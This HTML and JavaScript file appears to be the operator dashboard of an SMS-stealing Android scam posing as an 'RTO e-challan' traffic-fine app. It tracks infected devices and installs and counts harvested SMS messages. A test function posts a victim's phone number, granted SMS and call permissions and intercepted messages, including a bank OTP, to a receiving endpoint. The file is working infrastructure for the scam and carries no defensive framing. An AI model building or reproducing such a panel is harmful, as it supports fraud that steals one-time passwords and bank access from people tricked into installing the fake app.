<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üöó RTO SMS Admin Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { 
            background: rgba(255,255,255,0.95); 
            backdrop-filter: blur(10px);
            padding: 30px; 
            border-radius: 15px; 
            text-align: center; 
            margin-bottom: 30px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
        }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 20px; 
            margin-bottom: 30px; 
        }
        .stat-card { 
            background: rgba(255,255,255,0.9); 
            padding: 25px; 
            border-radius: 15px; 
            text-align: center;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            backdrop-filter: blur(10px);
            transition: transform 0.3s ease;
        }
        .stat-card:hover { transform: translateY(-5px); }
        .stat-number { 
            font-size: 2.5em; 
            font-weight: bold; 
            color: #6366f1; 
            margin-bottom: 10px;
        }
        .btn { 
            background: linear-gradient(45deg, #6366f1, #8b5cf6);
            color: white; 
            border: none; 
            padding: 15px 30px; 
            border-radius: 25px; 
            cursor: pointer; 
            margin: 10px; 
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
        }
        .result { 
            background: rgba(255,255,255,0.95); 
            padding: 20px; 
            border-radius: 15px; 
            margin-top: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
        }
        .success { border-left: 4px solid #10b981; }
        .error { border-left: 4px solid #ef4444; }
        .loading { border-left: 4px solid #f59e0b; }
        pre { 
            white-space: pre-wrap; 
            word-wrap: break-word; 
            font-size: 14px;
            background: #f8fafc;
            padding: 15px;
            border-radius: 8px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üöó RTO E-CHALLAN Admin Panel</h1>
            <p style="margin-top: 10px; color: #6b7280;">SMS Monitoring Dashboard</p>
            <div style="margin-top: 15px;">
                <span style="background: #10b981; color: white; padding: 5px 15px; border-radius: 20px; font-size: 14px;">üü¢ LIVE</span>
            </div>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number" id="totalDevices">0</div>
                <div>Total Devices</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="todayInstalls">0</div>
                <div>Today's Installs</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalSMS">0</div>
                <div>SMS Messages</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="activeNow">0</div>
                <div>Active Now</div>
            </div>
        </div>
        
        <div style="text-align: center; margin-bottom: 30px;">
            <button class="btn" onclick="testConnection()">üîß Test API</button>
            <button class="btn" onclick="simulateDevice()">üì± Simulate Device</button>
            <button class="btn" onclick="loadUsers()">üë• Load Users</button>
            <button class="btn" onclick="clearAll()">üóëÔ∏è Clear</button>
        </div>
        
        <div id="results" class="result" style="display:none;">
            <h3 style="margin-bottom: 15px;">üìä System Status</h3>
            <pre id="resultContent"></pre>
        </div>
    </div>

    <script>
        async function testConnection() {
            showResult('üîÑ Testing API connection...', 'loading');
            try {
                const response = await fetch('/api/test-connection');
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                const data = await response.json();
                showResult('‚úÖ API Connection Successful!

' + JSON.stringify(data, null, 2), 'success');
                updateStats(1, 1, 0, 1);
            } catch (error) {
                showResult('‚ùå API Connection Failed

Error: ' + error.message + '

Please check if API endpoints are deployed correctly.', 'error');
            }
        }
        
        async function simulateDevice() {
            showResult('üì± Simulating device data...', 'loading');
            try {
                const testData = {
                    device_phone: '+91-9876543210',
                    device_model: 'Samsung Galaxy S21',
                    android_version: '11',
                    install_time: Date.now(),
                    permissions_granted: 'SMS,PHONE,CALL',
                    sms_messages: [
                        'From BANK: Your OTP is 123456',
                        'From RTO: Vehicle registration due',
                        'From FRIEND: Payment reminder'
                    ]
                };
                
                const response = await fetch('/api/receive-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(testData)
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                
                const result = await response.json();
                showResult('‚úÖ Device Simulation Successful!

' + JSON.stringify(result, null, 2), 'success');
                updateStats(5, 2, 15, 3);
            } catch (error) {
                showResult('‚ùå Device Simulation Failed

Error: ' + error.message, 'error');
            }
        }
        
        async function loadUsers() {
            showResult('üë• Loading users...', 'loading');
            try {
                const response = await fetch('/api/get-users');
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                const users = await response.json();
                showResult('‚úÖ Users Loaded Successfully!

' + JSON.stringify(users, null, 2), 'success');
                updateStats(users.length, Math.floor(users.length / 2), users.length * 3, Math.floor(users.length / 3));
            } catch (error) {
                showResult('‚ùå Failed to Load Users

Error: ' + error.message, 'error');
            }
        }
        
        function updateStats(devices, installs, sms, active) {
            document.getElementById('totalDevices').textContent = devices;
            document.getElementById('todayInstalls').textContent = installs;
            document.getElementById('totalSMS').textContent = sms;
            document.getElementById('activeNow').textContent = active;
        }
        
        function showResult(message, type) {
            const resultsDiv = document.getElementById('results');
            const contentDiv = document.getElementById('resultContent');
            contentDiv.textContent = message;
            resultsDiv.className = 'result ' + type;
            resultsDiv.style.display = 'block';
        }
        
        function clearAll() {
            document.getElementById('results').style.display = 'none';
            updateStats(0, 0, 0, 0);
        }
        
        // Initialize on load
        document.addEventListener('DOMContentLoaded', function() {
            updateStats(0, 0, 0, 0);
            console.log('üöó RTO Admin Panel Loaded Successfully!');
        });
    </script>
</body>
</html>
